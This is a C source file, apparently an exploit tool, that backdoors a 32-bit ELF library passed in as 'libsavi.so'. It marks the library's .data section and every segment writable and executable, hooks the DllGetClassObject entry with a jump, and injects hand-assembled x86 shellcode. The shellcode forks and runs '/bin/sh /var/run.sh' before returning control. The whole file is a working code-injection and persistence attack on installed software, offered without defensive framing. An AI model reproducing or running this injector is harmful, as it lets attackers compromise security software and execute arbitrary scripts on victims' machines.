#include <stdio.h>
#include <elf.h>
#include <assert.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdbool.h>

unsigned char shellcode1[] ={
    0xE9,0x11,0x22,0x33,0x44, // jmp 0x11223344(placeholder)
    0x90,0x90 //nop,nop (patch the space)
};

unsigned char shellcode2[] = {
    0x69,0x6E,0x73,0x65,0x72,0x74,0x65,0x64,0x00, //inserted flag 8
    0x55,0x57,0x56,0x53, // push ebp,edi,esi,ebx; 12
    0x83,0xEC,0x0C, // sub esp,0xc 15
    0x50,0x51,0x52, // push eax,ecx,edx 18

    0x31,0xC0, // xor eax,eax 20
    0xB0,0x02, // mov al,0x2 22
    0xCD,0X80, // int 0x80 24
    0x83,0xF8,0x00, // cmp eax,0 27
    0x75,0x30, // jne  29
    0xE8,0x00,0x00,0x00,0x00, // get cur+5 address 34
    0x59, // pop ecx, store current address in ecx 35
    0x8D,0x99,0x11,0x22,0x33,0x44, // lea ebx,[ecx+11223344] 41
    0x8D,0x81,0x11,0x22,0x33,0x44, // lea eax,[ecx+11223344] 47
    0x89,0x41,0x4E, // mov [ecx+78],eax 50
    0x8D,0x81,0x11,0x22,0x33,0x44, // lea eax,[ecx+11223344] 56
    0x89,0x41,0x52, // mov [ecx+82],eax 59
    0xC7,0x41,0x56,0x00,0x00,0x00,0x00, // mov [ecx+86],0
    0x8D,0x49,0x4E, // lea ecx,[ecx+78] 69
    0x31,0xD2, // xor edx,edx 71
    0x31,0xC0, // xor eax,eax 73
    0xB0,0x0B, // mov al,0x0B 75
    0xCD,0x80, // int 0x80 77

    0x5A,0x59,0x58, //pop edx,ecx,eax 80
    0xE9,0x11,0x22,0x33,0x44, //jmp 0x11223344 85
    0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,0x00, // /bin/sh 93
    0x2F,0x76,0x61,0x72,0x2F,0x72,0x75,0x6E,0x2E,0x73,0x68,0x00, // /var/run.sh 105
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

void read_elf_header(FILE* fd, Elf32_Ehdr *eh)
{
    assert(eh != NULL);
    assert(fseek(fd, 0, SEEK_SET) == 0);
    assert(fread((void*)eh, sizeof(Elf32_Ehdr),1,fd) == 1 );
    printf("Read ELF header successfully\n");
}

void read_section_header(FILE* fd, Elf32_Shdr *sh_table, Elf32_Ehdr *eh)
{
    assert(sh_table != NULL);
    assert(fseek(fd,eh->e_shoff,SEEK_SET) == 0);
    assert(fread(sh_table,sizeof(Elf32_Shdr),eh->e_shnum,fd) == eh->e_shnum);
    printf("Read section header successfully\n");
}

void read_program_header(FILE* fd, Elf32_Phdr *ph_table, Elf32_Ehdr *eh)
{
    assert(ph_table != NULL);
    assert(fseek(fd,eh->e_phoff,SEEK_SET) == 0);
    assert(fread(ph_table,sizeof(Elf32_Phdr),eh->e_phnum,fd) == eh->e_phnum);
    printf("Read program header successfully\n");
}

void read_dynsym_data(FILE* fd, Elf32_Sym *sym_table, uint32_t sym_off, uint32_t sym_size)
{
    assert(sym_table != NULL);
    assert(fseek(fd,sym_off,SEEK_SET) == 0);
    assert(fread(sym_table,sym_size,1,fd) == 1);
    printf("Read .dynsym setion data successfully\n");
}

bool is_ELF(Elf32_Ehdr *en)
{
    if(strncmp((char*)en->e_ident, "/177ELF",4))
    {
        printf("FIle is ELF\n");
        return 1;
    }
    printf("Not ELF\n");
    return 0;
}

void usage()
{
    printf("usage:\n");
    printf("./exp_code /path/to/libsavi.so\n");
    exit(0);
}

int main(int argc,char *argv[])
{
    if(argc != 2) usage();
    FILE* fd = fopen(argv[1],"r+");
    
    if(fd<0){
        printf("Error %d Unable to open %s\n",fd,argv[1]);
        return 0;
    }

    // read ELF header
    Elf32_Ehdr *eh =(Elf32_Ehdr*)malloc(sizeof(Elf32_Ehdr));
    read_elf_header(fd, eh);
    if(!is_ELF(eh)) return 0;

    // read section header
    printf("ELF has %d Sections, now reading section header from 0x%x\n",eh->e_shnum,eh->e_shoff);
    Elf32_Shdr *sh_table = (Elf32_Shdr*)malloc(sizeof(Elf32_Shdr) * eh->e_shnum);
    read_section_header(fd, sh_table, eh);
    
    printf("now get .shstrtab section offset \n");
    // get .shstrtab data address
    uint32_t shstr_off = sh_table[eh->e_shstrndx].sh_offset;
    fseek(fd,shstr_off,SEEK_SET);
    char* pstr = fd->_IO_read_ptr;
    printf(".shstrtab data begin on 0x%x\n",shstr_off);
    
    // get some necessary section information
    int i = 0;
    int br = 0;
    uint32_t privi = 0x7;
    uint32_t data_addr = 0, data_off = 0, data_size = 0;
    uint32_t sym_addr = 0, sym_off = 0, sym_size = 0, sym_num = 0;
    uint32_t str_addr = 0, str_off = 0;
    Elf32_Sym *sym_table = NULL;

    for(i=0;i<eh->e_shnum;i++)
    {
        fseek(fd,shstr_off,SEEK_SET);
        if(!strcmp(pstr + sh_table[i].sh_name,".data")) 
        {
            // get .data virtual address and offset in file
            data_addr = sh_table[i].sh_addr;
            data_off = sh_table[i].sh_offset;
            data_size = sh_table[i].sh_size;
            printf(".data section virtual address is 0x%x, offset in file is 0x%x\n",data_addr,data_off);

            // change the privilege of .data
            fseek(fd,eh->e_shoff+(i*sizeof(Elf32_Shdr))+8,SEEK_SET);
            fwrite(&privi,sizeof(uint32_t),1,fd);
            printf("change the .data section privilege to 0x7\n");
            br++;
        }
        else if(!strcmp(pstr + sh_table[i].sh_name,".dynsym"))
        {
            // get symbol table address and size
            sym_addr = sh_table[i].sh_addr;
            sym_off = sh_table[i].sh_offset;
            sym_size = sh_table[i].sh_size;
            sym_num = sym_size/sizeof(Elf32_Sym);
            printf(".dynsym section virtual address is 0x%x, offset in file is 0x%x\n",sym_addr,sym_off);
            
            // read symbol data
            sym_table = (Elf32_Sym*)malloc(sym_size);
            read_dynsym_data(fd,sym_table,sym_off,sym_size);
            br++;
        }
        else if(!strcmp(pstr + sh_table[i].sh_name,".dynstr"))
        {
            // get .dynstr virtual address
            str_addr = sh_table[i].sh_addr;
            str_off = sh_table[i].sh_offset;
            printf(".dynstr section virtual address is 0x%x, offset in file is 0x%x\n",str_addr,str_off);
            br++;
        }
        if(br == 3) break;
    }

    // read program header
    Elf32_Phdr *ph_table = (Elf32_Phdr*)malloc(sizeof(Elf32_Phdr)*eh->e_phnum);
    read_program_header(fd,ph_table,eh);

    // change all the privilege of segment
    for(i=0;i<eh->e_phnum;i++)
    {
        fseek(fd,eh->e_phoff+(i*sizeof(Elf32_Phdr))+24,SEEK_SET);
        fwrite(&privi,sizeof(uint32_t),1,fd);
    }
    printf("change all segment privilege to 0x7\n");

    // if can't find "inserted", then find enough all-zero area for shellcode
    int j = 0, zero = 0, count_zero = 0;
    uintptr_t insert_caddr = 0, insert_waddr = 0;
    uint32_t iszero =1;
    char* tmp_str = malloc(sizeof("inserted"));

    fseek(fd,data_off,SEEK_CUR);
    for(j=0;j<data_size;j++)
    {
        fread(tmp_str,sizeof("inserted"),1,fd);
        if(!strcmp(tmp_str,"inserted")) 
        {
            printf("shellcode had been inserted");
            return 0; 
        }
        fseek(fd,data_off+j,SEEK_SET);
        fread(&iszero,1,1,fd);
        if(iszero == 0x0)
        {
            if(zero == 0)
            {
                zero =1;
                insert_caddr = data_addr+j+1; // for computing the RVA
                insert_waddr = data_off+j+1;  // for writing the shellcode to file
                // add 1 to avoid the last character '\0' of string
            }
            else if(zero == 1)
            {
                count_zero ++;
                if(count_zero >= sizeof(shellcode2)+sizeof(shellcode1))
                {
                    printf("find enugh space to inject the shellcode,the entry address is 0x%x\n",insert_caddr);
                    break;
                }
            }
        }
        else
        {
            zero = 0;
            count_zero = 0;
        }
    }
    if (j >= data_size)
    {
        printf("cant find enugh space for shellcode\n");
        return 0;
    }

    // get address of function DllGetClassObject
    int c=0;
    uint32_t dll_addr=0;
    for(c=0;c<sym_num;c++)
    {
        fseek(fd,str_off+sym_table[c].st_name,SEEK_SET);
        if(!strcmp(fd->_IO_read_ptr,"DllGetClassObject"))
        {
            dll_addr = sym_table[c].st_value;
            printf("DllGetClassObject function entry address is 0x%x\n",dll_addr);
            break;
        }  
    }
    if(c>=sym_num)
    {
        printf("cant find DllGetClassObject funtion\n");
        return 0;
    }

    // compute the RVA
    uint32_t tmp_addr = 0;

    // compute the inserted address
    tmp_addr = insert_caddr+9 - dll_addr - 5;
    memcpy(shellcode1+1,&tmp_addr,sizeof(tmp_addr));
    printf("RVA of inserted address is 0x%x\n",tmp_addr);

    tmp_addr = 86 - 36 + 1;
    memcpy(shellcode2+38,&tmp_addr,sizeof(tmp_addr));

    tmp_addr = 86 - 42 + 7;
    memcpy(shellcode2+44,&tmp_addr,sizeof(tmp_addr));

    tmp_addr = 94 - 51 + 16;
    memcpy(shellcode2+53,&tmp_addr,sizeof(tmp_addr));

    printf("run '/bin/sh' program, and args is ['/bin/sh','/var/run.sh']\n");
    
    // compute the jump-back address
    tmp_addr = dll_addr + 7 - insert_caddr - 81 - 5;
    memcpy(shellcode2+82,&tmp_addr,sizeof(tmp_addr));
    printf("RVA of jump-back address is 0x%x\n",tmp_addr);

    fseek(fd,dll_addr,SEEK_SET);
    fwrite(shellcode1,sizeof(shellcode1),1,fd);

    fseek(fd,insert_waddr,SEEK_SET);
    fwrite(shellcode2,sizeof(shellcode2),1,fd);
    printf("shellcode inject successfully");
    fclose(fd); 
    return 0;
}   